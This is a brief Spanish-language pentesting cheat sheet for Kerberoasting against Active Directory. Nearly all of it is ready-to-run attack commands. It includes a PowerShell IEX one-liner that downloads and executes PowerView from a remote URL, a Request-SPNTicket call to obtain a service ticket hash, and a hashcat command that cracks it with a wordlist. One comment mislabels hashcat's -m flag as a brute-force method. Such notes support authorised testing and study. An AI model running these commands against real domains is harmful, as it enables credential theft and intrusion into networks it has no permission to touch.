# Kerberoasting 

Tags: #AD #Kerberoasting #Powershell #PowerView #HashCat 

## Obtener Hash con PowerView

```powershell
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');

❯ Request-SPNTicket -SPN "MSSQL/sql.domain1.corp"

Nota:
	1. Conocer el SPN enumerando el usuario 
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 13100 hash-kerberoasting /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 13100 = TGS de un Kerberoasting
	# hash-kerberoasting = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```